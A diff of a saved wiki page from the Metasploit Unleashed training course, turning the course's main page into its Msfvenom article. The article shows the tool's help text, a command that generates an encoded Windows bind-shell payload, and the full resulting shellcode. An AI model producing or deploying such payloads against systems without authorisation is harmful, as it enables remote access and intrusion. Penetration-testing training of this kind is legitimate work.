@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Msfvenom - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Msfvenom" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Msfvenom&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Msfvenom&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Msfvenom&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,232 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Msfvenom</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Msfvenom#column-one">navigation</a>, <a href="Msfvenom#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>msfvenom is a combination of <a href="Msfpayload" title="Msfpayload">Msfpayload</a> and <a href="Msfencode" title="Msfencode">Msfencode</a>, putting both of these tools into a single framework instance.  The advantages of msfvenom are:
+</p>
+<ul><li>One single tool
+</li><li>Standardized command line options
+</li><li>Increased speed
+</li></ul>
+<p>Msfvenom has a wide range of options available:
+</p><p><pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#339966;'>msfvenom -h</span>
+Usage: /opt/metasploit/msf3/msfvenom [options] <var=val>
+
+Options:
+    -p, --payload    [payload]       Payload to use. Specify a '-' or stdin to use custom payloads
+    -l, --list       [module_type]   List a module type example: payloads, encoders, nops, all
+    -n, --nopsled    [length]        Prepend a nopsled of [length] size on to the payload
+    -f, --format     [format]        Format to output results in: raw, ruby, rb, perl, pl, bash, sh, c, js_be, js_le, java, dll, exe, exe-small, elf, macho, vba, vbs, loop-vbs, asp, war
+    -e, --encoder    [encoder]       The encoder to use
+    -a, --arch       [architecture]  The architecture to use
+        --platform   [platform]
+                                     The platform of the payload
+    -s, --space      [length]        The maximum size of the resulting payload
+    -b, --bad-chars  [list]          The list of characters to avoid example: '\x00\xff'
+    -i, --iterations [count]         The number of times to encode the payload
+    -c, --add-code   [path]          Specify an additional win32 shellcode file to include
+    -x, --template   [path]          Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
+    -h, --help                       Show this message
+
+</pre>
+<br />
+An example of the usage of msfvenom can be seen below:
+<br />
+<br />	
+<pre>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#339966;'>msfvenom -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3</span>
+[*] x86/shikata_ga_nai succeeded with size 325 (iteration=1)
+[*] x86/shikata_ga_nai succeeded with size 352 (iteration=2)
+[*] x86/shikata_ga_nai succeeded with size 379 (iteration=3)
+buf = 
+"\xd9\xf6\xbd\xb7\x89\xbd\x46\xd9\x74\x24\xf4\x58\x2b\xc9" +
+"\xb1\x59\x31\x68\x17\x03\x68\x17\x83\x5f\x75\x5f\xb3\x46" +
+"\x71\x1a\x95\x40\x4a\x8b\x3f\xc4\x96\xdf\x9d\x15\x1e\xae" +
+"\x4c\x64\xf5\xc9\x73\xd3\xed\x6a\x9e\x8e\xd7\xac\x6a\x5c" +
+"\x2a\x70\xe5\x06\xe4\x8e\x89\xf4\x28\xf2\x25\x33\x69\x23" +
+"\xe0\xe6\x51\x13\x9c\x44\x6e\xdd\xfe\x25\xeb\xc8\x15\xfe" +
+"\xb3\x43\x7a\x2b\x26\x53\x95\x3a\x14\x84\x57\x53\x71\xe8" +
+"\xba\x25\x82\xca\xb8\xee\x5f\x92\x4b\xea\x33\x6a\xa7\x8e" +
+"\x5d\x87\x35\x89\x8d\x34\xb0\xf1\x85\x03\xc3\xf1\xe7\x4a" +
+"\x5e\xfb\x17\x3c\x2c\x5f\xd5\xd4\x8f\xf0\x5c\x2d\x7f\xde" +
+"\x77\x45\x36\x85\x95\xff\xc9\x98\xbd\x74\x77\x33\x62\xe9" +
+"\x36\xbd\x56\xe1\xf5\xba\x37\x90\xff\x75\x75\x9d\xee\x30" +
+"\xed\x57\x97\x9e\xe8\xce\x65\xec\xa3\x36\x90\x04\x48\x67" +
+"\x4b\xf7\xbc\x1c\xdc\xcf\x6e\x03\xb5\xec\x3b\xe3\x21\x43" +
+"\x99\x3e\x81\x39\x3e\xfc\x42\x47\xdd\xa1\x5e\x71\x1a\x6c" +
+"\x67\x5e\xc8\xa9\xfd\x11\x60\x1b\x09\x2a\xe5\x5d\x4b\xf7" +
+"\x08\x80\x21\xca\x0f\xa6\x03\x64\xcf\x89\x72\x0f\xbc\xe4" +
+"\x6a\x03\x84\x33\xab\x96\x49\x2b\x8b\x06\xfa\x5d\x20\x49" +
+"\xed\x46\xa8\x6e\x2d\x44\x42\xb9\xea\x6a\x25\x7e\xbb\x67" +
+"\x8b\x15\x06\xa3\x36\x3e\x19\x6d\x62\x08\xe2\x1f\x3d\xa7" +
+"\x85\xf1\x46\xf4\xb8\x96\x44\xd9\x9f\xfa\xe3\xd1\x29\xd5" +
+"\x83\xd1\xa3\xaf\x42\xde\x2f\x9f\x02\x8b\x77\x97\xf6\x65" +
+"\x10\x49\x0b\x13\xd6\x02\x0d\x02\xe7\x95\xa7\xcc\x72\x7d" +
+"\x41\xea\xab\x3b\xf2\xe6\x6f\x71\x4a\x46\x56\xba\x51\x15" +
+"\x15\x64\x1e\xbb\x6f\x35\xc4\xaa\xf0\x2d\xd8\x6a\x77\xa1" +
+"\x0e\xb1\x58\xaa\xda\x70\x4a\x23\x26\xeb\x70\x74\x91\xba" +
+"\x93\x7a\xe5\x72\xb9\x1d\xd5\x86\x8f\xb7\x73\xce\x3c\x63" +
+"\x08"</pre>
+</p><p>The command and resulting shellcode above generates a Windows bind shell with three iterations of the shikata_ga_nai encoder without any null bytes in our shellcode.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Exploit_Development" title="Exploit Development">Exploit Development</a> &gt; <a href="Exploit_Payloads" title="Exploit Payloads">Exploit Payloads</a> &gt; Msfvenom</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Msfvenom</strong> &#124; <a href="Msfpayload" title="Msfpayload">Msfpayload</a> &#124; <a href="Msfencode" title="Msfencode">Msfencode</a> &#124; <a href="Alphanumeric_Shellcode" title="Alphanumeric Shellcode">Alphanumeric Shellcode</a> &#124; <a href="Msfrop" title="Msfrop">Msfrop</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 492/1000000
+Preprocessor generated node count: 2607/1000000
+Post‐expand include size: 3088/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:100-0!*!0!*!*!*!* and timestamp 20131124015942 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Msfvenom&amp;oldid=1591">http://www.offensive-security.com/w/index.php?title=Msfvenom&amp;oldid=1591</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Exploit_Payloads&amp;action=edit&amp;redlink=1" class="new" title="Category:Exploit Payloads (page does not exist)">Exploit Payloads</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +717,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.166 secs. --></body></html>
